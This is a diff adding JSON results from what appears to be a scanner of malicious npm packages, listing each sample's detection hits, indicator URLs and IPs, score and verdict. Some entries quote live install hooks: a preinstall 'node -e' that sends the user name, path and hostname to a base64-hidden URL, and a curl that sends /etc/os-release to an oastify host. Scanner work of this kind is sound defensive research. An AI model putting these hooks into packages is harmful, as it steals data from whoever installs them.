@@ -1,0 +1,439 @@
+[
+  {
+    "sample": "2024-09-20-duckc2-api-v1.0.0",
+    "root": "../samples/extracted/2024-09-20-duckc2-api-v1.0.0/tmp/tmp_po3wjc6/duckc2-api/package",
+    "name": "duckc2-api",
+    "version": "1.0.0",
+    "install_scripts": {},
+    "hits": {
+      "CHILD_PROCESS": [
+        "oke.js",
+        "lib/cache/httpsx.js",
+        "lib/cache/FISHING.js"
+      ],
+      "NET_MODULE": [
+        "lib/cache/HTTPX.js: ['http2', 'https', 'net', 'tls']",
+        "lib/cache/WIND.js: ['net', 'tls']",
+        "lib/cache/SWORD.js: ['dns', 'http2', 'net', 'tls']"
+      ],
+      "HIGH_ENTROPY": [
+        "lib/cache/HTTPX.js: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn...",
+        "lib/cache/WIND.js: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn...",
+        "lib/cache/SWORD.js: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn..."
+      ],
+      "HOST_FINGERPRINT": [
+        "lib/cache/WIND.js",
+        "lib/cache/httpsx.js",
+        "lib/cache/FISHING.js"
+      ],
+      "BASE64_DECODE": [
+        "lib/cache/WIND.js"
+      ],
+      "PARSE_FAIL": [
+        "lib/cache/HTRAN.js",
+        "lib/cache/TLSV.js"
+      ],
+      "OBFUSCATION": [
+        "lib/cache/HTRAN.js (longest line 5886)",
+        "lib/cache/TLSX.js (longest line 5265)",
+        "lib/cache/CSTRO.js (longest line 50644)"
+      ],
+      "SENSITIVE_PATH": [
+        "lib/cache/CSTRO.js: /etc/passwd"
+      ],
+      "HARDCODED_URL_IP": [
+        "http://anonymouse.org/cgi-bin/anon-www.cgi/"
+      ]
+    },
+    "iocs": {
+      "urls": [
+        "http://anonymouse.org/cgi-bin/anon-www.cgi/",
+        "http://coccoc.com/search#query=",
+        "http://ddosvn.somee.com/f5.php?v=",
+        "http://devlog.gregarius.net/docs/ua",
+        "http://downforeveryoneorjustme.com/",
+        "http://engadget.search.aol.com/search?q=",
+        "http://engadget.search.aol.com/search?q=query?=query=&q=",
+        "http://eu.battle.net/wow/en/search?q=",
+        "http://filehippo.com/search?q=",
+        "http://funnymama.com/search?q=",
+        "http://gais.cs.ccu.edu.tw/robot.php",
+        "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
+        "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
+        "http://go.mail.ru/search?mail.ru=1&q=",
+        "http://grub.org",
+        "http://help.baidu.com/searchResult?keywords=",
+        "http://help.yahoo.com/help/us/ysearch/slurp",
+        "http://host-tracker.com/check_page/?furl=",
+        "http://ip-api.com/json/",
+        "http://itch.io/search?q="
+      ],
+      "ips": [
+        "07.24.0.3",
+        "1.0.154.39",
+        "1.0.154.42",
+        "1.0.154.43",
+        "1.0.154.46",
+        "1.0.154.48",
+        "1.0.154.50",
+        "1.0.154.53",
+        "1.0.154.55",
+        "1.0.154.59",
+        "1.0.156.0",
+        "1.19.161.5",
+        "1.5.0.1",
+        "1.5.0.10",
+        "1.5.0.11",
+        "1.5.0.12",
+        "1.5.0.2",
+        "1.5.0.3",
+        "1.5.0.4",
+        "1.5.0.5"
+      ],
+      "decoded": []
+    },
+    "files_scanned": 15,
+    "parse_failures": 2,
+    "score": 100,
+    "verdict": "malicious",
+    "label": "malicious"
+  },
+  {
+    "sample": "2024-11-20-spid-gc-config-v5.1.4",
+    "root": "../samples/extracted/2024-11-20-spid-gc-config-v5.1.4/tmp/tmpwxvz7d39/spid-gc-config/package",
+    "name": "spid-gc-config",
+    "version": "5.1.4",
+    "install_scripts": {
+      "preinstall": "node index.js"
+    },
+    "hits": {
+      "INSTALL_HOOK": [
+        "preinstall: node index.js"
+      ],
+      "NET_MODULE": [
+        "index.js: ['dns', 'https']"
+      ],
+      "HOST_FINGERPRINT": [
+        "index.js"
+      ],
+      "HARDCODED_URL_IP": [
+        "https://discord.com/api/webhooks/1306068586086793297/REDACTED"
+      ]
+    },
+    "iocs": {
+      "urls": [
+        "https://discord.com/api/webhooks/1306068586086793297/REDACTED",
+        "https://ipinfo.io/json"
+      ],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 1,
+    "parse_failures": 0,
+    "score": 50,
+    "verdict": "suspicious",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-03-25-epic-comment-rating-v1.0.0",
+    "root": "../samples/extracted/2025-03-25-epic-comment-rating-v1.0.0/var/folders/rs/52vst_5924nc0zz5ccww9tl80000gp/T/tmpmg9y6l71/epic-comment-rating/package",
+    "name": "epic-comment-rating",
+    "version": "1.0.0",
+    "install_scripts": {},
+    "hits": {},
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 0,
+    "parse_failures": 0,
+    "score": 0,
+    "verdict": "low",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-05-25-blocks-nextjs-v9999.9999.10000",
+    "root": "../samples/extracted/2025-05-25-blocks-nextjs-v9999.9999.10000/tmp/tmpjjvj4uku/blocks-nextjs/package",
+    "name": "blocks-nextjs",
+    "version": "9999.9999.10000",
+    "install_scripts": {},
+    "hits": {
+      "NET_MODULE": [
+        "index.js: ['https']"
+      ],
+      "HIGH_ENTROPY": [
+        "index.js: geyybafvoogqfnn3xmadws172y8pwskh.oastify..."
+      ]
+    },
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 1,
+    "parse_failures": 0,
+    "score": 20,
+    "verdict": "low",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-06-19-mattermost-hardware-keyboard-v1.0.0",
+    "root": "../samples/extracted/2025-06-19-mattermost-hardware-keyboard-v1.0.0/tmp/tmpqk9kshmn/mattermost-hardware-keyboard/package",
+    "name": "mattermost-hardware-keyboard",
+    "version": "1.0.0",
+    "install_scripts": {
+      "preinstall": "node index.js"
+    },
+    "hits": {
+      "INSTALL_HOOK": [
+        "preinstall: node index.js"
+      ],
+      "NET_MODULE": [
+        "index.js: ['dns', 'https']"
+      ],
+      "HOST_FINGERPRINT": [
+        "index.js"
+      ],
+      "SENSITIVE_PATH": [
+        "index.js: /etc/passwd"
+      ]
+    },
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 1,
+    "parse_failures": 0,
+    "score": 60,
+    "verdict": "suspicious",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-07-08-tailwind-base-theme-v1.0.0",
+    "root": "../samples/extracted/2025-07-08-tailwind-base-theme-v1.0.0/tmp/tmphiel5v10/tailwind-base-theme/package",
+    "name": "tailwind-base-theme",
+    "version": "1.0.0",
+    "install_scripts": {},
+    "hits": {
+      "EVAL": [
+        "log.js"
+      ],
+      "ENV_ACCESS": [
+        "log.js"
+      ]
+    },
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 3,
+    "parse_failures": 0,
+    "score": 20,
+    "verdict": "low",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-08-13-epc-node-web-client-v10.0.0",
+    "root": "../samples/extracted/2025-08-13-epc-node-web-client-v10.0.0/tmp/tmp7efhdg97/epc-node-web-client/package",
+    "name": "epc-node-web-client",
+    "version": "10.0.0",
+    "install_scripts": {
+      "preinstall": "node -e \"const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dnpvMzBoMi5oMS5jaTo4ODQzLw==', 'base64').toString('ascii') + '?user=' + process.env.USER + '&path=' + process.cwd() + '&hostname=' + require('os').hostname(); const options = { rejectUnauthorized: false }; https.get(url, o"
+    },
+    "hits": {
+      "INSTALL_HOOK": [
+        "preinstall: node -e \"const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dn"
+      ],
+      "INSTALL_INLINE": [
+        "preinstall: node -e \"const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dn"
+      ],
+      "INSTALL_B64": [
+        "preinstall: node -e \"const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dn"
+      ],
+      "HARDCODED_URL_IP": [
+        "https://wvzo30h2.h1.ci:8843/"
+      ]
+    },
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": [
+        "https://wvzo30h2.h1.ci:8843/"
+      ]
+    },
+    "files_scanned": 0,
+    "parse_failures": 0,
+    "score": 55,
+    "verdict": "suspicious",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-09-14-graphql-sequelize-teselagen-v5.3.8",
+    "root": "../samples/extracted/2025-09-14-graphql-sequelize-teselagen-v5.3.8/tmp/tmpyn626mnf/graphql-sequelize-teselagen/package",
+    "name": "graphql-sequelize-teselagen",
+    "version": "5.3.8",
+    "install_scripts": {
+      "postinstall": "node bundle.js"
+    },
+    "hits": {
+      "INSTALL_HOOK": [
+        "postinstall: node bundle.js"
+      ],
+      "BASE64_DECODE": [
+        "lib/base64.js",
+        "lib/relay.js"
+      ],
+      "HARDCODED_URL_IP": [
+        "http://docs.sequelizejs.com/en/latest/docs/querying/"
+      ]
+    },
+    "iocs": {
+      "urls": [
+        "http://docs.sequelizejs.com/en/latest/docs/querying/"
+      ],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 12,
+    "parse_failures": 0,
+    "score": 40,
+    "verdict": "suspicious",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-09-15-ng-imports-checker-v0.0.9",
+    "root": "../samples/extracted/2025-09-15-ng-imports-checker-v0.0.9/tmp/tmpeli4rc5h/ng-imports-checker/package",
+    "name": "ng-imports-checker",
+    "version": "0.0.9",
+    "install_scripts": {
+      "postinstall": "node bundle.js"
+    },
+    "hits": {
+      "INSTALL_HOOK": [
+        "postinstall: node bundle.js"
+      ],
+      "HARDCODED_URL_IP": [
+        "http://art-ws.org,"
+      ]
+    },
+    "iocs": {
+      "urls": [
+        "http://art-ws.org,"
+      ],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 4,
+    "parse_failures": 0,
+    "score": 30,
+    "verdict": "low",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-11-17-calculator-40ed-v4.0.0",
+    "root": "../samples/extracted/2025-11-17-calculator-40ed-v4.0.0/tmp/tmp9vtgs_kp/calculator-40ed/package",
+    "name": "calculator-40ed",
+    "version": "4.0.0",
+    "install_scripts": {
+      "preinstall": "curl \"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release | base64 -w0`\"",
+      "postinstall": "node index.js"
+    },
+    "hits": {
+      "INSTALL_HOOK": [
+        "preinstall: curl \"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release ",
+        "postinstall: node index.js"
+      ],
+      "INSTALL_NET": [
+        "preinstall: curl \"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release "
+      ],
+      "INSTALL_B64": [
+        "preinstall: curl \"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release "
+      ],
+      "NET_MODULE": [
+        "index.js: ['https']"
+      ],
+      "ENV_ACCESS": [
+        "index.js"
+      ],
+      "ENV_DUMP": [
+        "index.js"
+      ],
+      "BASE64_DECODE": [
+        "index.js"
+      ],
+      "HARDCODED_URL_IP": [
+        "https://betsh1pquv6xorejopwm361en5txho5d.oastify.com/?q="
+      ]
+    },
+    "iocs": {
+      "urls": [
+        "https://betsh1pquv6xorejopwm361en5txho5d.oastify.com/?q=",
+        "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/"
+      ],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 1,
+    "parse_failures": 0,
+    "score": 100,
+    "verdict": "malicious",
+    "label": "malicious"
+  },
+  {
+    "sample": "2025-12-18-npe-toolkit-server-deps-v1.0.0",
+    "root": "../samples/extracted/2025-12-18-npe-toolkit-server-deps-v1.0.0/tmp/tmp9399hq81/npe-toolkit-server-deps/package",
+    "name": "npe-toolkit-server-deps",
+    "version": "1.0.0",
+    "install_scripts": {},
+    "hits": {},
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 0,
+    "parse_failures": 0,
+    "score": 0,
+    "verdict": "low",
+    "label": "malicious"
+  },
+  {
+    "sample": "2026-01-28-monorepo-cop-v9.9.0",
+    "root": "../samples/extracted/2026-01-28-monorepo-cop-v9.9.0/tmp/tmp_e1njani/monorepo-cop/package",
+    "name": "monorepo-cop",
+    "version": "9.9.0",
+    "install_scripts": {},
+    "hits": {},
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 1,
+    "parse_failures": 0,
+    "score": 0,
+    "verdict": "low",
+    "label": "malicious"
+  },
+  {
+    "sample": "2026-05-19-echarts-for-react-v3.0.7",
+    "root": "../samples/extracted/2026-05-19-echarts-for-react-v3.0.7/tmp/tmpr33jque0/echarts-for-react/package",
+    "name": "echarts-for-react",
+    "version": "3.0.7",
+    "install_scripts": {},
+    "hits": {},
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "decoded": []
+    },
+    "files_scanned": 14,
+    "parse_failures": 0,
+    "score": 0,
+    "verdict": "low",
+    "label": "malicious"
+  }
+]
